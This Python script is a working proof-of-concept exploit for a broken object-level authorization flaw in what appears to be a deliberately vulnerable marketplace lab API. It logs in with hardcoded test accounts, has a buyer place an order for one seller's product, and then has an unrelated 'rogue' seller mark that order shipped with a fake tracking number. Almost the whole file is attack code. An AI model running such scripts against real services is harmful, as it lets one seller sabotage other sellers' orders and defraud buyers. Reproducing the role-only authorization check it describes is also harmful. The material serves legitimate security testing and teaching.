#!/usr/bin/env python3
"""
BAC-3 — BOLA: Any Seller Ships Any Order
Endpoint: PUT /api/orders/{order_id}/ship
Auth    : Any seller account

The seller-specific ownership check was replaced with a role-only check.
Any authenticated seller can now mark any order as shipped — regardless
of whether they are the actual seller for that order.

Impact: A malicious seller can inject fake tracking numbers into
competitor orders, force delivery confirmations, or sabotage fulfilment.

Usage
-----
    python poc_007_bola_ship_any_order.py
"""

import argparse
import sys
import requests

BUYER_EMAIL      = "charlie@mercury.com"
BUYER_PASSWORD   = "Buyer123!"
LEGIT_SELLER     = "alice@mercury.com"
LEGIT_SELLER_PWD = "Seller123!"
ROGUE_SELLER     = "bob@mercury.com"
ROGUE_SELLER_PWD = "Seller123!"

PRODUCT_ID = 1   # Alice's product


def banner():
    print("=" * 60)
    print("  BAC-3 — BOLA: Any Seller Ships Any Order")
    print("  Endpoint: PUT /api/orders/{id}/ship")
    print("=" * 60)


def login(base_url, email, password, label):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {label}"); sys.exit(1)
    print(f"[+] Authenticated as {label} ({email})")
    return token


def deposit(base_url, token, amount):
    requests.post(f"{base_url}/api/wallet/deposit",
                  headers={"Authorization": f"Bearer {token}"},
                  json={"amount": amount, "payment_method": "card"}, timeout=10)


def place_order(base_url, token, product_id):
    resp = requests.post(f"{base_url}/api/orders",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"items": [{"product_id": product_id, "quantity": 1}],
                               "shipping_address": "123 Test St"}, timeout=10)
    resp.raise_for_status()
    data = resp.json()
    print(f"[+] Order placed (id={data['id']}, seller via items)")
    return data["id"]


def ship_order(base_url, token, order_id, label):
    resp = requests.put(f"{base_url}/api/orders/{order_id}/ship",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"tracking_number": "FAKE-ROGUE-TRACK-999"}, timeout=10)
    if resp.status_code == 200:
        print(f"[+] {label} successfully shipped order {order_id} with fake tracking!")
    else:
        print(f"[-] {label} got {resp.status_code}: {resp.json().get('detail')}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--product", type=int, default=PRODUCT_ID)
    args = parser.parse_args()

    banner()
    buyer_token  = login(args.url, BUYER_EMAIL,    BUYER_PASSWORD,   "Buyer  (charlie)")
    _            = login(args.url, LEGIT_SELLER,   LEGIT_SELLER_PWD, "Seller (alice) ")
    rogue_token  = login(args.url, ROGUE_SELLER,   ROGUE_SELLER_PWD, "Rogue  (bob)   ")
    print()

    deposit(args.url, buyer_token, 500)
    order_id = place_order(args.url, buyer_token, args.product)
    print(f"[*] Order belongs to alice's product. Bob has NO relation to it.")
    print()

    ship_order(args.url, rogue_token, order_id, "Bob (unrelated seller)")
    print("\n[+] Done.")


if __name__ == "__main__":
    main()
